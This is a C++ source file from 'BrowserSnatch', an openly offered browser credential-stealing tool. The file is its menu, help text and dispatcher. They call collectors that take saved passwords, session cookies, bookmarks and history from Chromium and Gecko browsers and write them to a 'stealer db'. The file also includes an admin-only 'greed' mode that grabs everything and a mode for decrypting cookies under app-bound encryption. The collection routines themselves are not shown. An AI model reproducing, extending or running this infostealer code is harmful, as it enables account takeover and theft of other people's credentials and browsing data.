#include "includes/Visualizer.h"
#include "includes/ChromiumParser.h"
#include "includes/GeckoParser.h"
#include "includes/AppBoundKeyParser.h"

Visualizer::Visualizer()
{}

Visualizer::~Visualizer()
{}

Visualizer::Visualizer(const std::string& converted_username, const std::string& stealer_db)
{
    this->converted_username = converted_username;
    this->stealer_db = stealer_db;
}

void Visualizer::visualization_main() {
    int choice;
    do {
        printMenu();
        std::cout << "\n\033[1;34mChoose an option to proceed (0-10): \033[0m";
        std::cin >> choice;

        handleUserChoice(choice);

        if (choice != 0) {
            std::cout << "\nPress Enter to continue...";
            std::cin.ignore();  // Consume newline character left by cin
            std::cin.get();     // Wait for Enter key
        }
    } while (choice != 0);
}

void Visualizer::clearConsole() {
    system("cls");
}

void Visualizer::printDivider(char ch, int length) {
    std::cout << std::string(length, ch) << std::endl;
}

void Visualizer::printMenu() {
    clearConsole();
    printDivider('=', 75);
    std::cout << "    \033[1;32mBrowserSnatch\033[0m - A Versatile Browser Data Extraction Tool © shaddy43" << std::endl;
    printDivider('=', 75);
    std::cout << "\n \033[1;36m[1]\033[0m Snatch Chromium Based Browser Passwords" << std::endl;
    std::cout << " \033[1;36m[2]\033[0m Snatch Gecko Based Browser Passwords" << std::endl;
    std::cout << " \033[1;36m[3]\033[0m Snatch Chromium Based Browser Cookies" << std::endl;
    std::cout << " \033[1;36m[4]\033[0m Snatch Gecko Based Browser Cookies" << std::endl;
    std::cout << " \033[1;36m[5]\033[0m Snatch Chromium Based Browser Bookmarks" << std::endl;
    std::cout << " \033[1;36m[6]\033[0m Snatch Gecko Based Browser Bookmarks" << std::endl;
    std::cout << " \033[1;36m[7]\033[0m Snatch Chromium Based Browser History" << std::endl;
    std::cout << " \033[1;36m[8]\033[0m Snatch Gecko Based Browser History" << std::endl;
    std::cout << " \033[1;36m[9]\033[0m Snatch Passwords & Cookies {default settings}" << std::endl;
    std::cout << " \033[1;31m[0]\033[0m Exit" << std::endl;
    printDivider('=', 75);
}

BOOL Visualizer::default_settings(std::string converted_username, std::string stealer_db)
{
    std::cout << "BrowserSnatch Executed with {default settings}" << std::endl;
    std::cout << "Snatching passwords & cookies..." << std::endl;
    if (!chromium_parser(converted_username, stealer_db))
        std::cout << "Chromium Browsers dump failed!" << std::endl;

    if (!gecko_parser(converted_username, stealer_db))
        std::cout << "Gecko Browsers dump failed!" << std::endl;

    if (!chromium_cookie_collector(converted_username, stealer_db))
        std::cout << "Chromium Cookie Collector failed!" << std::endl;

    if (!gecko_cookie_collector(converted_username, stealer_db))
        std::cout << "Gecko Cookie Collector failed!" << std::endl;

    if (std::filesystem::exists(stealer_db)) {
        std::cout << "Stealer db saved: " << stealer_db << std::endl;
        return true;
    }
    else {
        return false;
    }
}

BOOL Visualizer::greed_mode(std::string converted_username, std::string stealer_db)
{
    std::cout << "BrowserSnatch Executed with {greed_mode_settings}" << std::endl;
    std::cout << "Snatching everything..." << std::endl;
    if (!CheckProcessPriv())
    {
        std::cerr << "Admin Privileges Required !!!" << std::endl;
        exit(1);
    }

    if (!chromium_parser(converted_username, stealer_db))
        std::cout << "Chromium Browsers dump failed!" << std::endl;

    if (!gecko_parser(converted_username, stealer_db))
        std::cout << "Gecko Browsers dump failed!" << std::endl;

    if (!chromium_cookie_collector(converted_username, stealer_db))
        std::cout << "Chromium Cookie Collector failed!" << std::endl;

    if (!gecko_cookie_collector(converted_username, stealer_db))
        std::cout << "Gecko Cookie Collector failed!" << std::endl;

    if (!chromium_bookmarks_collector(converted_username, stealer_db))
        std::cout << "Chromium Bookmarks Collector failed!" << std::endl;

    if (!gecko_bookmarks_collector(converted_username, stealer_db))
        std::cout << "Gecko Bookmarks Collector failed!" << std::endl;

    if (!chromium_history_collector(converted_username, stealer_db))
        std::cout << "Chromium History Collector failed!" << std::endl;

    if (!gecko_history_collector(converted_username, stealer_db))
        std::cout << "Gecko History Collector failed!" << std::endl;

    // handles app-bound-decryption
    handler(14, "");

    if (std::filesystem::exists(stealer_db)) {
        std::cout << "Stealer db saved: " << stealer_db << std::endl;
        return true;
    }
    else {
        return false;
    }
}

void Visualizer::handleUserChoice(int choice) {
    switch (choice) {
    case 1:
        std::cout << "\n\033[1;33m>> Snatching Chromium Passwords...\033[0m" << std::endl;
        if (!chromium_parser(converted_username, stealer_db))
            std::cerr << "Chromium Password Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
        break;
    case 2:
        std::cout << "\n\033[1;33m>> Snatching Gecko Passwords...\033[0m" << std::endl;
        if (!gecko_parser(converted_username, stealer_db))
            std::cerr << "Gecko Password Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
        break;
    case 3:
        std::cout << "\n\033[1;33m>> Snatching Chromium Cookies...\033[0m" << std::endl;
        if (!chromium_cookie_collector(converted_username, stealer_db))
            std::cerr << "Chromium Cookie Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
        break;
    case 4:
        std::cout << "\n\033[1;33m>> Snatching Gecko Cookies...\033[0m" << std::endl;
        if (!gecko_cookie_collector(converted_username, stealer_db))
            std::cerr << "Gecko Cookie Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
        break;
    case 5:
        std::cout << "\n\033[1;33m>> Snatching Chromium Bookmarks...\033[0m" << std::endl;
        if (!chromium_bookmarks_collector(converted_username, stealer_db))
            std::cerr << "Chromium Bookmarks Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
        break;
    case 6:
        std::cout << "\n\033[1;33m>> Snatching Gecko Bookmarks...\033[0m" << std::endl;
        if (!gecko_bookmarks_collector(converted_username, stealer_db))
            std::cerr << "Gecko Bookmarks Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
        break;
    case 7:
        std::cout << "\n\033[1;33m>> Snatching Chromium History...\033[0m" << std::endl;
        if (!chromium_history_collector(converted_username, stealer_db))
            std::cerr << "Chromium History Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
        break;
    case 8:
        std::cout << "\n\033[1;33m>> Snatching Gecko History...\033[0m" << std::endl;
        if (!gecko_history_collector(converted_username, stealer_db))
            std::cerr << "Gecko History Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
        break;
    case 9:
        std::cout << "\n\033[1;33m>> Snatching Passwords and Cookies {default settings}...\033[0m" << std::endl;
        if (!default_settings(converted_username, stealer_db))
            std::cerr << "BrowserSnatch executed with {default settings}: failed" << std::endl;
        break;
    case 0:
        std::cout << "\n\033[1;31mExiting BrowserSnatch. Goodbye!\033[0m" << std::endl;
        break;
    default:
        std::cout << "\n\033[1;31mInvalid choice! Please try again.\033[0m" << std::endl;
    }
}

void Visualizer::displayHelp() {
    std::cout << "BrowserSnatch v2.1 - A versatile browser data extraction tool\n";
    std::cout << "(C) 2025 shaddy43\n\n";
    std::cout << "Usage: BrowserSnatch [OPTIONS]\n\n";
    std::cout << "No parameter        Run with default settings, snatch {passwords, cookies} from all browsers\n\n";
    std::cout << "Options:\n";
    std::cout << "  -h                          Help menu\n";
    std::cout << "  -pass                       Snatch passwords from every browser\n";
    std::cout << "  -pass -c                    Snatch passwords from Chromium browsers only\n";
    std::cout << "  -pass -g                    Snatch passwords from Gecko browsers only\n";
    std::cout << "  -cookies                    Snatch cookies from every browser\n";
    std::cout << "  -cookies -c                 Snatch cookies from Chromium browsers only\n";
    std::cout << "  -cookies -g                 Snatch cookies from Gecko browsers only\n";
    std::cout << "  -bookmarks                  Snatch bookmarks from every browser\n";
    std::cout << "  -bookmarks -c               Snatch bookmarks from Chromium browsers only\n";
    std::cout << "  -bookmarks -g               Snatch bookmarks from Gecko browsers only\n";
    std::cout << "  -history                    Snatch history from every browser\n";
    std::cout << "  -history -c                 Snatch history from Chromium browsers only\n";
    std::cout << "  -history -g                 Snatch history from Gecko browsers only\n";
    std::cout << "  -greed                      Snatch everything\n";
    std::cout << "  -app-bound-decryption       Snatch cookies encrypted with latest app bound encryption\n";
    std::cout << "  -console-mode               Launch BrowserSnatch Console Mode\n\n";
    std::cout << "For more details, visit: https://shaddy43.github.io\n";
}

void Visualizer::handler(int option, std::string service_parameter)
{
    if (option == 1)
    {
        if (!chromium_parser(converted_username, stealer_db))
            std::cerr << "Chromium Password Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
    }
    else if (option == 2)
    {
        if (!gecko_parser(converted_username, stealer_db))
            std::cerr << "Gecko Password Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
    }
    else if (option == 3)
    {
        if (!chromium_parser(converted_username, stealer_db) or !gecko_parser(converted_username, stealer_db))
            std::cerr << "Password Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
    }
    else if (option == 4)
    {
        if (!chromium_cookie_collector(converted_username, stealer_db))
            std::cerr << "Chromium Cookie Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
    }
    else if (option == 5)
    {
        if (!gecko_cookie_collector(converted_username, stealer_db))
            std::cerr << "Gecko Cookie Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
    }
    else if (option == 6)
    {
        if (!chromium_cookie_collector(converted_username, stealer_db) or !gecko_cookie_collector(converted_username, stealer_db))
            std::cerr << "Cookie Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
    }
    else if (option == 7)
    {
        if (!chromium_bookmarks_collector(converted_username, stealer_db))
            std::cerr << "Bookmarks Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
    }
    else if (option == 8)
    {
        if (!gecko_bookmarks_collector(converted_username, stealer_db))
            std::cerr << "Bookmarks Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
    }
    else if (option == 9)
    {
        if (!chromium_bookmarks_collector(converted_username, stealer_db) or !gecko_bookmarks_collector(converted_username, stealer_db))
            std::cerr << "Bookmarks Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
    }
    else if (option == 10)
    {
        if (!chromium_history_collector(converted_username, stealer_db))
            std::cerr << "History Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
    }
    else if (option == 11)
    {
        if (!gecko_history_collector(converted_username, stealer_db))
            std::cerr << "History Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
    }
    else if (option == 12)
    {
        if (!chromium_history_collector(converted_username, stealer_db) or !gecko_history_collector(converted_username, stealer_db))
            std::cerr << "History Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
    }
    else if (option == 13)
    {
        //greed mode
        if (!greed_mode(converted_username, stealer_db))
            std::cerr << "BrowserSnatch executed with {greed mode}: failed" << std::endl;
    }
    else if (option == 14)
    {
        //app-bound-decryption
        if (!app_bound_browsers_cookie_collector(converted_username, stealer_db, false, ""))
            std::cerr << "BrowserSnatch executed with {app_bound_decryption mode}: failed" << std::endl;

        // Pause before exit
        std::cout << "DB PATH: " << stealer_db << std::endl;
        std::cout << "\nPress any key to exit...";
        std::cin.get();
    }
    else if (option == 15)
    {
        //app-bound-decryption
        if (!app_bound_browsers_cookie_collector(converted_username, stealer_db, true, service_parameter))
            std::cerr << "BrowserSnatch executed with {app_bound_decryption mode}: failed" << std::endl;
    }
    else
    {
        std::cerr << "{LOG} invalid option passed" << std::endl;
    }
}
